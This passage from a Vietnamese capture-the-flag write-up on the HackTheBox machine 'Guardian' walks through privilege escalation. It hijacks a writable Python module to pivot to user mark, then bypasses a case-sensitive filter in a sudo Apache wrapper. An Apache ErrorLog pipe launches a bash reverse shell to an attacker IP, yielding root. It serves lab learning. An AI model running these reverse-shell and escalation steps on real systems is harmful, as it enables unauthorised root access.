</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Access denied.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">logs</span><span class="o">.</span><span class="n">collect_logs</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">action</span> <span class="o">==</span> <span class="s2">&#34;system-status&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">status</span><span class="o">.</span><span class="n">system_status</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Unknown action.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span></span></span></code></pre></div></div>
<p>Mã python có vẻ được dùng để kiểm tra các thông số của hệ thống, import các lib từ <code>utils</code>. Kiểm tra thư mục <code>utils</code></p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jamil@guardian:~$ ll /opt/scripts/utilities/utils/
</span></span><span class="line"><span class="cl">total <span class="m">24</span>
</span></span><span class="line"><span class="cl">drwxrwsr-x <span class="m">2</span> root root   <span class="m">4096</span> Jul <span class="m">10</span> 14:20 ./
</span></span><span class="line"><span class="cl">drwxr-sr-x <span class="m">4</span> root admins <span class="m">4096</span> Jul <span class="m">10</span> 13:53 ../
</span></span><span class="line"><span class="cl">-rw-r----- <span class="m">1</span> root admins  <span class="m">287</span> Apr <span class="m">19</span>  <span class="m">2025</span> attachments.py
</span></span><span class="line"><span class="cl">-rw-r----- <span class="m">1</span> root admins  <span class="m">246</span> Jul <span class="m">10</span> 14:20 db.py
</span></span><span class="line"><span class="cl">-rw-r----- <span class="m">1</span> root admins  <span class="m">226</span> Apr <span class="m">19</span>  <span class="m">2025</span> logs.py
</span></span><span class="line"><span class="cl">-rwxrwx--- <span class="m">1</span> mark admins  <span class="m">214</span> Nov <span class="m">20</span> 05:10 status.py*</span></span></code></pre></div></div>
<p>File <code>status.py</code> có quyền ghi đối với group <code>admins</code>, tôi không thể ghi file này với user hiện tại nhưng hoàn toàn có thể thay thay thế 1 file cùng tên với nội dung khác.</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span> &gt; status.py</span></span></code></pre></div></div>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jamil@guardian:~$ cp status.py /opt/scripts/utilities/utils/status.py</span></span></code></pre></div></div>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jamil@guardian:~$ cat /opt/scripts/utilities/utils/status.py 
</span></span><span class="line"><span class="cl">import pty<span class="p">;</span> pty.spawn<span class="o">(</span><span class="s2">&#34;/bin/bash&#34;</span><span class="o">)</span></span></span></code></pre></div></div>
<p>Chạy <code>utilities.py</code> với user <code>mark</code>, thêm option <code>system-status</code></p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jamil@guardian:~$ sudo -u mark /opt/scripts/utilities/utilities.py system-status
</span></span><span class="line"><span class="cl">mark@guardian:/home/jamil$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>mark<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mark<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>mark<span class="o">)</span>,1002<span class="o">(</span>admins<span class="o">)</span>
</span></span><span class="line"><span class="cl">mark@guardian:/home/jamil$ </span></span></code></pre></div></div>

<h3 class="relative group">root
    <div id="root" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#root" aria-label="Anchor">#</a>
    </span>
    
</h3>
<p><code>sudo -l</code></p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mark@guardian:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> mark on guardian:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,
</span></span><span class="line"><span class="cl">    use_pty
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User mark may run the following commands on guardian:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/safeapache2ctl</span></span></code></pre></div></div>
<p>Phân tích file <code>/usr/local/bin/safeapache2ctl</code></p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mark@guardian:~$ file /usr/local/bin/safeapache2ctl
</span></span><span class="line"><span class="cl">/usr/local/bin/safeapache2ctl: ELF 64-bit LSB pie executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span class="o">[</span>sha1<span class="o">]=</span>0690ef286458863745e17e8a81cc550ced004b12, <span class="k">for</span> GNU/Linux 3.2.0, not stripped
</span></span><span class="line"><span class="cl">mark@guardian:~$ strings /usr/local/bin/safeapache2ctl
</span></span><span class="line"><span class="cl">/lib64/ld-linux-x86-64.so.2
</span></span><span class="line"><span class="cl">__cxa_finalize
</span></span><span class="line"><span class="cl">fgets
</span></span><span class="line"><span class="cl">................
</span></span><span class="line"><span class="cl">PTE1
</span></span><span class="line"><span class="cl">u+UH
</span></span><span class="line"><span class="cl">&lt;/uMH
</span></span><span class="line"><span class="cl">%31s %1023s
</span></span><span class="line"><span class="cl">Include
</span></span><span class="line"><span class="cl">IncludeOptional
</span></span><span class="line"><span class="cl">LoadModule
</span></span><span class="line"><span class="cl">/home/mark/confs/
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Blocked: %s is outside of %s
</span></span><span class="line"><span class="cl">Usage: %s -f /home/mark/confs/file.conf
</span></span><span class="line"><span class="cl">realpath
</span></span><span class="line"><span class="cl">Access denied: config must be inside %s
</span></span><span class="line"><span class="cl">fopen
</span></span><span class="line"><span class="cl">Blocked: Config includes unsafe directive.
</span></span><span class="line"><span class="cl">apache2ctl
</span></span><span class="line"><span class="cl">/usr/sbin/apache2ctl
</span></span><span class="line"><span class="cl">execl failed
</span></span><span class="line"><span class="cl">:*3$<span class="s2">&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0
</span></span></span><span class="line"><span class="cl"><span class="s2">Scrt1.o
</span></span></span><span class="line"><span class="cl"><span class="s2">__abi_tag
</span></span></span><span class="line"><span class="cl"><span class="s2">crtstuff.c
</span></span></span><span class="line"><span class="cl"><span class="s2">deregister_tm_clones
</span></span></span><span class="line"><span class="cl"><span class="s2">...............</span></span></span></code></pre></div></div>
<p>Đây là một binary dùng để chạy <code>apache2ctl</code>. Thực sự là tôi không có nhiều kinh nghiệm với việc xử lý hay khai thác leo thang đặc quyền bằng cái file binary như thế này, nên một lần nữa phải nhờ đến sự giúp đỡ của anh bạn AI.</p>
<p>Dưới đây là tổng hợp kết quả phân tích tôi nhận được.</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="761"
    height="871"
    src="/ctf/hackthebox/guardian/29.png"
    srcset="/ctf/hackthebox/guardian/29.png 800w, /ctf/hackthebox/guardian/29.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/29.png"></figure>
<p>Từ phần 3, filter này chỉ lọc những chuỗi xác định sẵn, trong khi Apache không phân biệt chữ hoa và chữ thường, nghĩa là tôi vẫn có thể nạp các module độc hại sử dụng chuỗi không viết hoa, ví dụ như thay <code>LoadModule</code> bằng <code>loadmodule</code>, mục tiêu là cố gắng chèn thêm payload vào file config và ép apache2 load file config mới này.</p>
<p>Sau rất nhiều lần cãi nhau với Claude, thử và lỗi, thì cuối cùng tôi đã thành công.</p>
<p>Đầu tiên tạo 1 revershell trong <code>/tmp</code>, mục tiêu là dùng file <code>.conf</code> để load shell này.</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nano /tmp/shell.sh</span></span></code></pre></div></div>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl">/bin/bash -c <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.165/4444 0&gt;&amp;1&#39;</span></span></span></code></pre></div></div>
<p>Tạo file <code>.conf</code> trong thư mục <code>confs/</code>, vì <code>safeapache2ctl</code> chỉ load file trong thư mục này.</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nano confs/exploit.conf</span></span></code></pre></div></div>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PidFile /tmp/evil.pid
</span></span><span class="line"><span class="cl">Listen <span class="m">8888</span>
</span></span><span class="line"><span class="cl">User mark
</span></span><span class="line"><span class="cl">Group mark
</span></span><span class="line"><span class="cl">ServerRoot /etc/apache2
</span></span><span class="line"><span class="cl">include /etc/apache2/mods-enabled/*.load
</span></span><span class="line"><span class="cl">ErrorLog <span class="s2">&#34;|/tmp/shell.sh&#34;</span></span></span></code></pre></div></div>
<ul>
<li><code>PidFile /tmp/evil.pid</code>: Apache mặc định dùng file PID ở <code>/var/run/apache2/pid</code>. Khi một Apache khác đang chạy (service chính), file này bị khóa. Trỏ PidFile ra <code>/tmp/</code> (nơi ai cũng ghi được) và đặt tên khác đi. Điều này lừa Apache mới rằng &ldquo;Chưa có ai chạy cả, mình được phép khởi động&rdquo;.</li>
<li><code>Listen 8888</code>: Service Apache chính đang chiếm dụng cổng 80. Hai tiến trình không thể lắng nghe cùng một cổng trên cùng một IP, nên đổi sang 1 cổng nào đó bất kỳ &gt;1024.</li>
<li><code>User mark</code> / <code>Group mark</code>: Apache có cơ chế an toàn, nếu thấy mình được chạy bởi root, nó sẽ cố gắng chuyển quyền (drop privileges) sang user khác để xử lý request web. Nếu không khai báo User/Group, hoặc module xử lý user (<code>mod_unixd</code>) chưa load, Apache sẽ panic và không khởi động.</li>
<li><code>include /etc/apache2/mods-enabled/*.load</code>: Khi dùng <code>-f</code>, Apache chạy &ldquo;trần trụi&rdquo;, không load bất kỳ module nào (kể cả module quan trọng nhất là MPM để quản lý process). Nếu thiếu MPM, Apache chết ngay lập tức (lỗi <code>No MPM loaded</code>). Việc đoán tên từng file <code>.so</code> rất dễ sai. Thay vì đoán thì load tất cả những gì hệ thống đang dùng. Sử dụng từ khóa <strong><code>include</code> (viết thường)</strong> để bypass được filter trong binary.</li>
<li><code>ErrorLog &quot;|/bin/bash /tmp/shell.sh&quot;</code>: Chỉ thị <code>ErrorLog</code> của Apache cho phép ghi log vào file HOẶC gửi log vào một chương trình khác thông qua pipe (<code>|</code>). Chương trình trong pipe được khởi tạo bởi <strong>Parent Process</strong> của Apache. Vì <code>safeapache2ctl</code> chạy SUID Root -&gt; Parent Process là Root -&gt; Chương trình trong pipe (<code>bash</code>) chạy dưới quyền <strong>Root</strong>.</li>
</ul>
<p>Bật listener với port 4444</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">penelope -p <span class="m">4444</span></span></span></code></pre></div></div>
<p>Load config mới vừa tạo</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo /usr/local/bin/safeapache2ctl -f confs/exploit.conf</span></span></code></pre></div></div>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mark@guardian:~$ sudo /usr/local/bin/safeapache2ctl -f confs/exploit.conf
</span></span><span class="line"><span class="cl">AH00558: apache2: Could not reliably determine the server<span class="s1">&#39;s fully qualified domain name, using 10.10.11.84. Set the &#39;</span>ServerName<span class="s1">&#39; directive globally to suppress this message
</span></span></span><span class="line"><span class="cl"><span class="s1">Action &#39;</span>-f /home/mark/confs/exploit.conf<span class="err">&#39;</span> failed.
</span></span><span class="line"><span class="cl">The Apache error log may have more information.</span></span></code></pre></div></div>
<p>Quay trở lại listener</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/machines/Guardian<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ penelope -p <span class="m">4444</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.232.128 • 172.20.0.1 • 172.17.0.1 • 172.19.0.1 • 172.18.0.1 • 10.10.14.165
</span></span><span class="line"><span class="cl">➤  🏠 Main Menu <span class="o">(</span>m<span class="o">)</span> 💀 Payloads <span class="o">(</span>p<span class="o">)</span> 🔄 Clear <span class="o">(</span>Ctrl-L<span class="o">)</span> 🚫 Quit <span class="o">(</span>q/Ctrl-C<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Got reverse shell from guardian~10.10.11.84-Linux-x86_64 😍 Assigned SessionID &lt;1&gt;
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Attempting to upgrade shell to PTY...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Shell upgraded successfully using /usr/bin/python3! 💪
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Interacting with session <span class="o">[</span>1<span class="o">]</span>, Shell Type: PTY, Menu key: F12 
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Logging to /home/kali/.penelope/sessions/guardian~10.10.11.84-Linux-x86_64/2025_11_20-09_39_16-468.log 📜
</span></span><span class="line"><span class="cl">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</span></span><span class="line"><span class="cl">root@guardian:/etc/apache2# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="cl">root@guardian:/etc/apache2# <span class="nb">cd</span>
</span></span><span class="line"><span class="cl">bash: cd: HOME not <span class="nb">set</span>
</span></span><span class="line"><span class="cl">root@guardian:/etc/apache2# <span class="nb">cd</span> /root
</span></span><span class="line"><span class="cl">root@guardian:/root# ls
</span></span><span class="line"><span class="cl">root.txt  scripts
</span></span><span class="line"><span class="cl">root@guardian:/root# </span></span></code></pre></div></div>

          
          
          
        </div>
        
        

        

        

      </div>
    </section>

    
    <footer class="pt-8 max-w-prose print:hidden">
      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
      <div class="flex justify-between pt-3">
        <span class="flex flex-col">
          
            <a
              class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
              href="/ctf/hackthebox/imagery/">
              <span class="leading-6">
                <span class="inline-block rtl:rotate-180">&larr;</span>&ensp;Hackthebox - Imagery
              </span>
            </a>
            
              <span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
                <time datetime="2025-10-07T00:00:00&#43;00:00">7 October 2025</time>
              </span>
            
          
        </span>
        <span class="flex flex-col items-end">
          
        </span>
      </div>
    </div>
  


      
    </footer>
  </article>

        


  






<div
  id="scroll-to-top"
  class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200">
  <a
    href="#the-top"
    class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top"
    title="Scroll to top">
    &uarr;
  </a>
</div>

      </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
      
      
        
          
          
      
      
      
      <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400 ">
        <ul class="flex list-none flex-col sm:flex-row">
          
            <li class=" flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 ">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
                href="/tags/"
                title="Tags">
                
                Tags
              </a>
            </li>
          
            <li class=" flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 ">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
                href=""
                title="">
                
                
              </a>
            </li>
          
        </ul>
      </nav>
    
  
  <div class="flex items-center justify-between">
    
    
      <p class="text-sm text-neutral-500 dark:text-neutral-400">
          &copy;
          2026
          TAH
      </p>
    

    
    
      <p class="text-xs text-neutral-500 dark:text-neutral-400">
        
        
        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
      </p>
    
  </div>
  
    <script>
      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
        margin: 24,
        background: "rgba(0,0,0,0.5)",
        scrollOffset: 0,
      });
    </script>
  
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
  data-url="http://localhost:1313/">
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0">
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)">
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span>
      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

    </div>
  </body>
  
</html>
